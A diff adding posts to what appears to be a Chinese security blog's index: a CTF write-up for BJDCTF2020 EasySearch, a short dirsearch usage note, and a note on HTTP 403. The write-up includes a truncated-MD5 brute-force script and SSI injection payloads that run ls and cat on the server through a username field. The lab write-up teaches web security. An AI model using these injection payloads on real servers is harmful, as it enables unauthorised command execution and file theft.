@@ -4,6 +4,83 @@
   
     
     <entry>
+      <title>post[BJDCTF2020]EasySearch</title>
+      <link href="/2020/07/31/post-BJDCTF2020-EasySearch/"/>
+      <url>/2020/07/31/post-BJDCTF2020-EasySearch/</url>
+      
+        <content type="html"><![CDATA[<p><strong>开始的时候感觉这个页面好熟悉啊，后来发现webug3.0有这个，好像是，跟这个界面类似。总结还是写后面吧</strong></p><h4 id="1-信息泄露"><a href="#1-信息泄露" class="headerlink" title="1.信息泄露"></a>1.信息泄露</h4><p>目录扫描，下次除非提醒不需要扫目录一定先扫目录，可以用一下ctf的专用dict，github上面总结的一堆<br><img src= "/img/loading.gif" data-src="1.png" alt=""><br>效果很好，有临时文件.swp<br>内容如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ob_start();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_hash</span><span class="params">()</span></span>&#123;</span><br><span class="line">$chars = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-'</span>;</span><br><span class="line">$random = $chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].$chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].$chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].$chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].$chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)];<span class="comment">//Random 5 times</span></span><br><span class="line">$content = uniqid().$random;</span><br><span class="line"><span class="keyword">return</span> sha1($content); </span><br><span class="line">&#125;</span><br><span class="line">    header(<span class="string">"Content-Type: text/html;charset=utf-8"</span>);</span><br><span class="line">***</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) <span class="keyword">and</span> $_POST[<span class="string">'username'</span>] != <span class="string">''</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        $admin = <span class="string">'6d0bc1'</span>;</span><br><span class="line">        <span class="keyword">if</span> ( $admin == substr(md5($_POST[<span class="string">'password'</span>]),<span class="number">0</span>,<span class="number">6</span>)) &#123;     <span class="comment">#这一行和上一行代码是重点。</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('[+] Welcome to manage system')&lt;/script&gt;"</span>;</span><br><span class="line">            $file_shtml = <span class="string">"public/"</span>.get_hash().<span class="string">".shtml"</span>;</span><br><span class="line">            $shtml = fopen($file_shtml, <span class="string">"w"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to open file!"</span>);</span><br><span class="line">            $text = <span class="string">'</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Hello,'</span>.$_POST[<span class="string">'username'</span>].<span class="string">'&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">***'</span>;</span><br><span class="line">            fwrite($shtml,$text);</span><br><span class="line">            fclose($shtml);</span><br><span class="line">            ***</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"[!] Header  error ..."</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('[!] Failed')&lt;/script&gt;"</span>;</span><br><span class="line">            </span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">***</span><br><span class="line">    &#125;</span><br><span class="line">***</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>admin要破解md5前五位，已知前五位，求加密前，我有脚本（上次有个xss题用到了）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python2.7</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">(md5_val)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">999999</span>, <span class="number">10000000</span>):</span><br><span class="line">        md5_value=hashlib.md5(str(x)).hexdigest()</span><br><span class="line">        <span class="keyword">if</span> md5_value[:<span class="number">6</span>]==md5_val:</span><br><span class="line">            <span class="keyword">return</span> str(x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">print</span> func(<span class="string">'6d0bc1'</span>)</span><br></pre></td></tr></table></figure><p>跑脚本得密码为2020666，用户名随意。</p><h3 id="2-ssi漏洞利用"><a href="#2-ssi漏洞利用" class="headerlink" title="2.ssi漏洞利用"></a>2.ssi漏洞利用</h3><p>在响应头里发现提示，其实第一步得到的源码里也能看出来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Url_is_here: public&#x2F;e69bd4343d1dd98651b449d3e6e3d6acb8c32996.shtml</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file_shtml = <span class="string">"public/"</span>.get_hash().<span class="string">".shtml"</span>;</span><br></pre></td></tr></table></figure><p>但是还是响应里的这个提示快，直接进，<br><img src= "/img/loading.gif" data-src="2.png" alt=""><br>如图，这里返回了我们的用户名，而用户名又是我们可以控制的，这里正好符合ssi注入漏洞的利用条件。</p><p><a href="https://blog.csdn.net/qq_40657585/article/details/84260844" target="_blank" rel="noopener">看这篇文章</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;--# exec cmd&#x3D;&quot;命令&quot;--&gt;</span><br></pre></td></tr></table></figure><h5 id="1-ls本目录下文件"><a href="#1-ls本目录下文件" class="headerlink" title="1.ls本目录下文件"></a>1.ls本目录下文件</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;--# exec cmd&#x3D;&quot;ls&quot;--&gt;</span><br></pre></td></tr></table></figure><p>上面的payload作为文件名注入，切记public目录下的hash值也会变的，名字改一次，换一个filename。<br>当前目录没有flag文件，其实在上一目录下。</p><h5 id="2-ls上目录的文件"><a href="#2-ls上目录的文件" class="headerlink" title="2.ls上目录的文件"></a>2.ls上目录的文件</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;--# exec cmd&#x3D;&quot;ls ..&#x2F;&quot;--&gt;</span><br></pre></td></tr></table></figure><p>上一目录的文件有</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">flag_990c66bf85a09c664f0b6741840499b2</span><br><span class="line">index.php</span><br><span class="line">index.php.swp</span><br><span class="line">public</span><br></pre></td></tr></table></figure><p>很明显，我们的文件就是<code>flag_990c66bf85a09c664f0b6741840499b2</code>这个</p><h5 id="3-cat-flag"><a href="#3-cat-flag" class="headerlink" title="3.cat ../flag"></a>3.cat ../flag</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#exec cmd&#x3D;&quot;cat ..&#x2F;flag_990c66bf85a09c664f0b6741840499b2&quot;--&gt;</span><br></pre></td></tr></table></figure><p>就得到flag了。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> ctfwp之web </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> shtml之ssi注入 </tag>
+            
+            <tag> 信息泄露 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>dirsearch使用详解</title>
+      <link href="/2020/07/31/dirsearch%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3/"/>
+      <url>/2020/07/31/dirsearch%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3/</url>
+      
+        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>我打算弄个各种工具的使用详解以供阅读者参考，或者我自己也可以很快速的查询各种工具的使用方式，总的来说备忘的用处更多吧，传到博客后再传到云盘。</p><h5 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h5><p>命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dirsearch.py -u 目标网址域名或IP -e 目标语言[如php，选择使用*则通配]</span><br></pre></td></tr></table></figure><p>这是基本的使用，option<code>-u</code>与<code>-e</code>也是我们必须要使用的选项。</p><h5 id="时间选项"><a href="#时间选项" class="headerlink" title="时间选项"></a>时间选项</h5><p>这个选项是<code>-s</code>后面跟的是延迟的时间，通常我们可以使用<br><code>-s 0.5</code><br>来防止网站崩溃</p><h5 id="字典选项"><a href="#字典选项" class="headerlink" title="字典选项"></a>字典选项</h5><p><code>-w</code>选项指示字典，字典的目录是<code>/db/</code>，这样就可以自建字典了</p><h5 id="随机选项"><a href="#随机选项" class="headerlink" title="随机选项"></a>随机选项</h5><p><code>--random-agents</code> 使用随机UA，这个后面不用跟上啥东西了。</p><blockquote><p>就到这了，以后再需要啥我还会继续向下总结</p></blockquote>]]></content>
+      
+      
+      <categories>
+          
+          <category> web学习笔记 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> web工具使用 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>总结之HTTP响应状态码</title>
+      <link href="/2020/07/31/%E6%80%BB%E7%BB%93%E4%B9%8BHTTP%E5%93%8D%E5%BA%94%E7%8A%B6%E6%80%81%E7%A0%81/"/>
+      <url>/2020/07/31/%E6%80%BB%E7%BB%93%E4%B9%8BHTTP%E5%93%8D%E5%BA%94%E7%8A%B6%E6%80%81%E7%A0%81/</url>
+      
+        <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>这里总结了各种状态码，主要是怕忘，其实遇到的次数多了，就会很好记了，熟能生巧。</p><h5 id="403"><a href="#403" class="headerlink" title="403"></a>403</h5><p>403 forbidden，禁止访问或没有权限访问，通常是存在这个资源的，获取不到就是因为你的权限不足而已。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> web学习笔记 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> web总结 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>[HarekazeCTF2019]encode_and_encode</title>
       <link href="/2020/07/29/HarekazeCTF2019-encode-and-encode/"/>
       <url>/2020/07/29/HarekazeCTF2019-encode-and-encode/</url>
